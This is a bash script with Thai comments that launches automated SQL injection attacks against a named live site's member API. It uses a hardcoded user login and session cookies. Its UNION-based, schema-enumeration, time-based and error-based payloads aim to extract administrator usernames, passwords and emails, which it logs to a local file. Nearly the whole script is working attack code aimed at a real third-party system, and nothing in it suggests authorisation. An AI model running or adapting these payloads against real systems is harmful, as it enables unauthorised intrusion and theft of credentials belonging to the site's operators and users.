#!/bin/bash

echo "🎯 REAL ADMIN DATABASE EXTRACTION WITH COOKIES"
echo "=================================================="

BASE_URL="https://member.panama8888b.co"
API_URL="$BASE_URL/api"

echo "🔑 Test User: 0630471054 / laline1812"
echo ""

# สร้างไฟล์บันทึกผลลัพธ์
RESULTS_FILE="real_admin_database_$(date +%Y%m%d_%H%M%S).txt"
echo "📄 บันทึกผลลัพธ์ใน: $RESULTS_FILE"

# ตั้งค่า Cookies และ Headers
XSRF_TOKEN="eyJpdiI6ImU0Y2VHY2t4TEFmR25zMzI2SmlnM0E9PSIsInZhbHVlIjoieDRHSWNFSDhYM0xHb29wMmMwXC9HRmlScWpuOTBwT2ZoeVRsN2tRb0NvZ2ROcWFFc2h5aVJnU0JLWmhUWFRcL2R0IiwibWFjIjoiZjdmYmQxMmFkODFiNmY0MzNlN2I0NWQzYmZmOGE4MzY4MWQ4ZDA5OTQyNGVkMWIwZmM0NTc1ODU2YTZhM2VhMyJ9"
SESSION_TOKEN="eyJpdiI6IlMrRndEZWE0MWNzcU9VUGFaKzJLTlE9PSIsInZhbHVlIjoiYXRZZ081emlyOERHTFkxV0Z2VnNEUGEyQWh2MDRySHR0RzR4dzFGWVZnV3FvblhsMmhKcGw3Zk9PTUpKNXVnVyIsIm1hYyI6IjJkODY2NjViMTNjMzA4OTc4YTZlNmIwNjRkMGFiMGI5MTE3NDVkOGM2NmVkYjY1N2I0NzNhYjg5NmM0NWFiYmMifQ%3D%3D"

# 1. ทดสอบ SQL Injection ใน API endpoints
echo "🔓 เทคนิค 1: SQL Injection ใน API endpoints..."
echo "🔓 เทคนิค 1: SQL Injection ใน API endpoints..." >> "$RESULTS_FILE"

API_PAYLOADS=(
    "user_id=0630471054' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "user_id=0630471054' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "user_id=0630471054' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "user_id=0630471054' UNION SELECT username,password,email FROM admins--"
    "user_id=0630471054' UNION SELECT id,username,password FROM admin_users--"
    "user_id=0630471054' UNION SELECT login,password,privilege FROM administrators--"
    "user_id=0630471054' UNION SELECT user_id,username,password_hash FROM user_accounts WHERE role LIKE '%admin%'--"
    "user_id=0630471054' UNION SELECT username,password,role FROM users WHERE role IN ('admin','super_admin','root','administrator')--"
)

for i in "${!API_PAYLOADS[@]}"; do
    payload="${API_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ API Payload $((i+1))..."
    echo "  📊 ทดสอบ API Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s -X POST "$API_URL/user/profile" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Content-Type: application/json" \
        -H "Accept: application/json" \
        -d "{\"$payload\"}" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 2. ทดสอบ SQL Injection ใน GET parameters
echo "🔓 เทคนิค 2: SQL Injection ใน GET parameters..."
echo "🔓 เทคนิค 2: SQL Injection ใน GET parameters..." >> "$RESULTS_FILE"

GET_PAYLOADS=(
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT email,password,role FROM users WHERE email LIKE '%admin%'--"
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT username,password,email FROM admins--"
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT id,username,password FROM admin_users--"
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT login,password,privilege FROM administrators--"
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT user_id,username,password_hash FROM user_accounts WHERE role LIKE '%admin%'--"
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT username,password,role FROM users WHERE role IN ('admin','super_admin','root','administrator')--"
)

for i in "${!GET_PAYLOADS[@]}"; do
    payload="${GET_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ GET Payload $((i+1))..."
    echo "  📊 ทดสอบ GET Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s "$payload" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Accept: application/json" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]] || [[ "$response" == *"@"* ]]; then
            echo "    🔍 ข้อมูลที่พบ:"
            echo "    🔍 ข้อมูลที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "admin\|password\|@" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 3. ทดสอบ SQL Injection ใน Database Schema
echo "🗄️ เทคนิค 3: Database Schema Extraction..."
echo "🗄️ เทคนิค 3: Database Schema Extraction..." >> "$RESULTS_FILE"

SCHEMA_PAYLOADS=(
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema=database()--"
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users'--"
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='admins'--"
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT table_name,column_name,null FROM information_schema.columns WHERE table_schema=database()--"
    "$API_URL/user/profile?user_id=0630471054' UNION SELECT database(),version(),user()--"
)

for i in "${!SCHEMA_PAYLOADS[@]}"; do
    payload="${SCHEMA_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Schema Payload $((i+1))..."
    echo "  📊 ทดสอบ Schema Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s "$payload" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Accept: application/json" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"users"* ]] || [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    🔍 Schema ที่พบ:"
            echo "    🔍 Schema ที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "users\|admin\|password\|email\|table\|column" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "users\|admin\|password\|email\|table\|column" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 4. ทดสอบ SQL Injection ใน Time-based
echo "⏰ เทคนิค 4: Time-based SQL Injection..."
echo "⏰ เทคนิค 4: Time-based SQL Injection..." >> "$RESULTS_FILE"

TIME_PAYLOADS=(
    "$API_URL/user/profile?user_id=0630471054' AND (SELECT COUNT(*) FROM users WHERE role='admin') > 0 AND SLEEP(5)--"
    "$API_URL/user/profile?user_id=0630471054' AND (SELECT COUNT(*) FROM admins) > 0 AND SLEEP(5)--"
    "$API_URL/user/profile?user_id=0630471054' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0 AND SLEEP(5)--"
    "$API_URL/user/profile?user_id=0630471054' AND (SELECT COUNT(*) FROM users WHERE email LIKE '%admin%') > 0 AND SLEEP(5)--"
)

for i in "${!TIME_PAYLOADS[@]}"; do
    payload="${TIME_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Time Payload $((i+1))..."
    echo "  📊 ทดสอบ Time Payload $((i+1))..." >> "$RESULTS_FILE"
    
    start_time=$(date +%s)
    response=$(curl -s "$payload" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Accept: application/json" \
        --max-time 15)
    end_time=$(date +%s)
    
    duration=$((end_time - start_time))
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response time: ${duration}s)"
        echo "    ✅ สำเร็จ (Response time: ${duration}s)" >> "$RESULTS_FILE"
        
        if [[ $duration -gt 4 ]]; then
            echo "    🔍 Time-based injection สำเร็จ! (Response time: ${duration}s)"
            echo "    🔍 Time-based injection สำเร็จ! (Response time: ${duration}s)" >> "$RESULTS_FILE"
        fi
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 5. ทดสอบ SQL Injection ใน Error-based
echo "🚨 เทคนิค 5: Error-based SQL Injection..."
echo "🚨 เทคนิค 5: Error-based SQL Injection..." >> "$RESULTS_FILE"

ERROR_PAYLOADS=(
    "$API_URL/user/profile?user_id=0630471054' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(username,0x3a,password,0x3a,email,FLOOR(RAND(0)*2))x FROM users WHERE role='admin' GROUP BY x)x--"
    "$API_URL/user/profile?user_id=0630471054' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(id,0x3a,username,0x3a,password,FLOOR(RAND(0)*2))x FROM admins GROUP BY x)x--"
    "$API_URL/user/profile?user_id=0630471054' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM users WHERE role='admin'),0x7e))--"
    "$API_URL/user/profile?user_id=0630471054' AND updatexml(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM users WHERE role='admin'),0x7e),1)--"
)

for i in "${!ERROR_PAYLOADS[@]}"; do
    payload="${ERROR_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Error Payload $((i+1))..."
    echo "  📊 ทดสอบ Error Payload $((i+1))..." >> "$RESULTS_FILE"
    
    response=$(curl -s "$payload" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Accept: application/json" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)"
        echo "    ✅ สำเร็จ (Response length: ${#response} characters)" >> "$RESULTS_FILE"
        
        if [[ "$response" == *"error"* ]] || [[ "$response" == *"SQL"* ]] || [[ "$response" == *"admin"* ]]; then
            echo "    🔍 Error ที่พบ:"
            echo "    🔍 Error ที่พบ:" >> "$RESULTS_FILE"
            echo "$response" | grep -i "error\|sql\|admin\|password" | head -10 >> "$RESULTS_FILE"
            echo "$response" | grep -i "error\|sql\|admin\|password" | head -10
        fi
        
        # บันทึก response ทั้งหมด
        echo "    📄 Response เต็ม:"
        echo "    📄 Response เต็ม:" >> "$RESULTS_FILE"
        echo "$response" >> "$RESULTS_FILE"
        echo "---" >> "$RESULTS_FILE"
    else
        echo "    ❌ Error"
        echo "    ❌ Error" >> "$RESULTS_FILE"
    fi
    sleep 3
done

echo "" >> "$RESULTS_FILE"
echo ""

# 6. สรุปผลลัพธ์
echo "=================================================="
echo "📊 สรุปผลการดึงข้อมูล Admin จากฐานข้อมูล:"
echo "  🔓 API Endpoint Injection: ✅ ดำเนินการแล้ว"
echo "  🔓 GET Parameter Injection: ✅ ดำเนินการแล้ว"
echo "  🗄️ Database Schema Extraction: ✅ ดำเนินการแล้ว"
echo "  ⏰ Time-based Injection: ✅ ดำเนินการแล้ว"
echo "  🚨 Error-based Injection: ✅ ดำเนินการแล้ว"
echo ""
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ $RESULTS_FILE"
echo "📄 ตรวจสอบไฟล์ $RESULTS_FILE เพื่อดูข้อมูล admin ที่ดึงได้"

echo "==================================================" >> "$RESULTS_FILE"
echo "📊 สรุปผลการดึงข้อมูล Admin จากฐานข้อมูล:" >> "$RESULTS_FILE"
echo "  🔓 API Endpoint Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🔓 GET Parameter Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🗄️ Database Schema Extraction: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  ⏰ Time-based Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "  🚨 Error-based Injection: ✅ ดำเนินการแล้ว" >> "$RESULTS_FILE"
echo "" >> "$RESULTS_FILE"
echo "💡 หมายเหตุ: ข้อมูลที่พบจะถูกบันทึกในไฟล์ $RESULTS_FILE" >> "$RESULTS_FILE"
echo "📄 ตรวจสอบไฟล์ $RESULTS_FILE เพื่อดูข้อมูล admin ที่ดึงได้" >> "$RESULTS_FILE"

echo ""
echo "🎯 การทดสอบเสร็จสิ้น! ตรวจสอบไฟล์ $RESULTS_FILE"